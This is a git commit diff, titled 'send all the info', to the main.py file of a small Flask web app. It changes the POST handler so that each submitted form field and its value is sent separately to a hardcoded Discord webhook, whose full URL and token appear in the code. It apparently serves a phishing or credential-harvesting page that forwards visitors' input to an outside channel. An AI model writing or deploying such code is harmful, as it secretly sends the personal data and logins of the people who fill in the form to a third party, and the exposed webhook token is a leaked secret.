b944db2643c8e4da8dabe81ce5d0bf775694de9a
BuildTools <unconfigured@null.spigotmc.org>
2022-11-11 13:52:39 +0200

    send all the info

--- main.py
+++ main.py
@@ -9,7 +9,8 @@ def hello_world():
     
     if request.method == 'POST':
         a = request.form
-        requests.post("https://discord.com/api/webhooks/1040584398619295756/PZt9A0VhIzKJzvbeBhB0oMJx5Cd7lnPNzXcr1M9O8OsUpxRwtBRWtrxdAMm_4KbmozUD", data={"content":a})
+        for item, value in a.items():
+            requests.post("https://discord.com/api/webhooks/1040584398619295756/PZt9A0VhIzKJzvbeBhB0oMJx5Cd7lnPNzXcr1M9O8OsUpxRwtBRWtrxdAMm_4KbmozUD", data={"content":f"{item}:{value}"})
         return render_template('base.html', a=a)
     else:
         return render_template('base.html', a=None)
